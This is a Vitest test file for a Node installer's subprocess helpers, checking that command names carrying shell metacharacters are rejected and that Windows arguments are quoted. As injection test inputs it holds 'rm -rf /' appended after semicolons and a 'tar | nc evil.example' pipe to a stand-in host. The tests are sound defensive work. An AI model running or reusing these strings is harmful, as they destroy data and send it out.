import { spawnSync } from "node:child_process";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { ClawchatError } from "../../src/errors";
import { captureCommand, prepareArgs, runCommand } from "../../src/installers/run";

vi.mock("node:child_process", () => ({
  spawnSync: vi.fn(),
}));

const spawnSyncMock = vi.mocked(spawnSync);

describe("runCommand", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("rejects a command name carrying shell metacharacters", async () => {
    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);

    await expect(runCommand("openclaw; rm -rf /", ["plugins"])).rejects.toMatchObject({
      code: "SUBPROCESS",
      message: expect.stringContaining("unsafe shell metacharacter in command name"),
    });

    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it.skipIf(process.platform === "win32")(
    "passes arguments through untouched on POSIX, where no shell sees them",
    async () => {
      spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);

      // `shell: false` means execvp gets these as argv — a `;` is just a byte
      // inside one argument, never a command separator.
      await runCommand("openclaw", ["plugins", "install", "pkg.tgz; rm -rf /", "--force"]);

      expect(spawnSyncMock).toHaveBeenCalledWith(
        "openclaw",
        ["plugins", "install", "pkg.tgz; rm -rf /", "--force"],
        expect.objectContaining({ shell: false }),
      );
    },
  );

  it("wraps spawn errors in ClawchatError", async () => {
    spawnSyncMock.mockReturnValue({
      error: new Error("not found"),
      status: null,
    } as ReturnType<typeof spawnSync>);

    await expect(runCommand("openclaw", ["plugins"])).rejects.toEqual(
      new ClawchatError("SUBPROCESS", "openclaw failed: not found"),
    );
  });

  it("throws on non-zero status and includes stderr", async () => {
    spawnSyncMock.mockReturnValue({
      status: 2,
      stderr: "bad plugin\n",
    } as ReturnType<typeof spawnSync>);

    await expect(runCommand("hermes", ["plugins", "install", "clawling/clawchat-plugin-hermes-agent"])).rejects.toEqual(
      new ClawchatError(
        "SUBPROCESS",
        "hermes plugins install clawling/clawchat-plugin-hermes-agent failed with exit code 2: bad plugin",
      ),
    );
  });

  it("passes timeout to spawnSync and reports ETIMEDOUT as a TIMEOUT error", async () => {
    const timeoutError = Object.assign(new Error("spawnSync git ETIMEDOUT"), { code: "ETIMEDOUT" });
    spawnSyncMock.mockReturnValue({
      error: timeoutError,
      status: null,
      signal: "SIGTERM",
    } as unknown as ReturnType<typeof spawnSync>);

    await expect(runCommand("git", ["clone", "https://example.com/x.git"], { timeoutMs: 1234 })).rejects.toMatchObject({
      code: "TIMEOUT",
      message: expect.stringContaining("timed out after 1234ms"),
    });

    expect(spawnSyncMock).toHaveBeenCalledWith(
      "git",
      ["clone", "https://example.com/x.git"],
      expect.objectContaining({ timeout: 1234, killSignal: "SIGKILL" }),
    );
  });

  it("merges the env option over process.env for the child only", async () => {
    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);
    process.env.CLAWCHAT_RUN_TEST_MARKER = "parent";

    await runCommand("git", ["clone", "https://example.com/x.git"], { env: { GIT_TERMINAL_PROMPT: "0" } });

    const passedEnv = spawnSyncMock.mock.calls[0]?.[2]?.env as Record<string, string>;
    expect(passedEnv.GIT_TERMINAL_PROMPT).toBe("0");
    // Inherited parent env is preserved alongside the override.
    expect(passedEnv.CLAWCHAT_RUN_TEST_MARKER).toBe("parent");
    delete process.env.CLAWCHAT_RUN_TEST_MARKER;
  });

  it("does not set a child env when no env option is given (inherits parent)", async () => {
    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);

    await runCommand("git", ["clone", "https://example.com/x.git"]);

    expect(spawnSyncMock.mock.calls[0]?.[2]?.env).toBeUndefined();
  });
});

describe("prepareArgs", () => {
  it("returns POSIX args verbatim — no shell is involved there", () => {
    const args = ["clone", "/tmp/a dir/plugin", "pkg.tgz; rm -rf /", "%HOME%"];
    expect(prepareArgs(args, "linux")).toEqual(args);
    expect(prepareArgs(args, "darwin")).toEqual(args);
  });

  it("quotes Windows paths instead of rejecting them", () => {
    // The regression this guards: every one of these used to throw, which made
    // `git clone <tmp dest>` and `hermes plugins install file://<dest>`
    // impossible on Windows — os.tmpdir() is always backslash-separated.
    expect(prepareArgs(["C:\\Users\\dev\\AppData\\Local\\Temp\\cc-1\\plugin"], "win32")).toEqual([
      '"C:\\Users\\dev\\AppData\\Local\\Temp\\cc-1\\plugin"',
    ]);
    expect(prepareArgs(["C:\\Users\\Zhang San\\plugin"], "win32")).toEqual([
      '"C:\\Users\\Zhang San\\plugin"',
    ]);
    expect(prepareArgs(["file://C:\\Users\\dev\\plugin"], "win32")).toEqual([
      '"file://C:\\Users\\dev\\plugin"',
    ]);
  });

  it("leaves plain Windows args unquoted", () => {
    expect(
      prepareArgs(
        ["plugins", "install", "@clawling/clawchat-plugin-openclaw", "--force", "1", "https://a.example/x.git"],
        "win32",
      ),
    ).toEqual(["plugins", "install", "@clawling/clawchat-plugin-openclaw", "--force", "1", "https://a.example/x.git"]);
  });

  it("doubles a trailing backslash run so it cannot escape the closing quote", () => {
    expect(prepareArgs(["C:\\dir with space\\"], "win32")).toEqual(['"C:\\dir with space\\\\"']);
  });

  it("neutralizes cmd.exe metacharacters by quoting them", () => {
    expect(prepareArgs(["a&b", "c|d", "e>f", "(g)"], "win32")).toEqual(['"a&b"', '"c|d"', '"e>f"', '"(g)"']);
    expect(prepareArgs([""], "win32")).toEqual(['""']);
  });

  it("still rejects what cmd.exe quoting cannot contain", () => {
    // %VAR% expands even inside double quotes, and a literal quote would close ours.
    for (const arg of ["%USERPROFILE%", 'say "hi"', "a\nb"]) {
      expect(() => prepareArgs([arg], "win32")).toThrowError(
        expect.objectContaining({
          code: "SUBPROCESS",
          message: expect.stringContaining("unsafe shell metacharacter in command input"),
        }),
      );
    }
  });
});

describe("captureCommand", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("returns stdout for successful commands", async () => {
    spawnSyncMock.mockReturnValue({
      status: 0,
      stdout: "openclaw 2026.3.28\n",
      stderr: "",
    } as ReturnType<typeof spawnSync>);

    await expect(captureCommand("openclaw", ["--version"])).resolves.toBe("openclaw 2026.3.28\n");
  });

  it("rejects an unsafe capture command name before spawning", async () => {
    spawnSyncMock.mockReturnValue({ status: 0 } as ReturnType<typeof spawnSync>);

    await expect(captureCommand("tar | nc evil.example 1", ["-tf", "pkg.tgz"])).rejects.toMatchObject({
      code: "SUBPROCESS",
      message: expect.stringContaining("unsafe shell metacharacter in command name"),
    });

    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it("accepts a path argument containing spaces", async () => {
    spawnSyncMock.mockReturnValue({ status: 0, stdout: "ok", stderr: "" } as ReturnType<typeof spawnSync>);

    await expect(captureCommand("tar", ["-xOf", "bad path.tgz", "package.json"])).resolves.toBe("ok");
    expect(spawnSyncMock).toHaveBeenCalled();
  });

  it("throws on non-zero capture status and includes stderr", async () => {
    spawnSyncMock.mockReturnValue({
      status: 1,
      stdout: "",
      stderr: "missing file\n",
    } as ReturnType<typeof spawnSync>);

    await expect(captureCommand("tar", ["-xOf", "/tmp/pkg.tgz", "package.json"])).rejects.toEqual(
      new ClawchatError("SUBPROCESS", "tar -xOf /tmp/pkg.tgz package.json failed with exit code 1: missing file"),
    );
  });
});
